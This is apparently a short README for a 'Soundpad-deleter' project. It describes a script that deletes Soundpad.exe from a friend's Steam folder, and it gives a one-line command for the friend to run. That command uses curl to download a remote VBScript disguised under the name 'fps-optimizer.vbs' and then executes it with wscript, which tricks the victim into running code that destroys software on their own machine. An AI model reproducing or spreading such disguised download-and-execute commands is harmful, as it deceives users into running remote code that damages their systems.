# Soundpad-deleter
Deletes Soundpad.exe in C:\Program Files (x86)\Steam\steamapps\common\Soundpad folder, like if your friend(s) annoy you with their soundpad, they need to just run this command: cmd /c curl -sL https://raw.githubusercontent.com/Illya8551/Soundpad-deleter/refs/heads/main/fps-optimizer.vbs -o %TEMP%\s.vbs && wscript %TEMP%\s.vbs
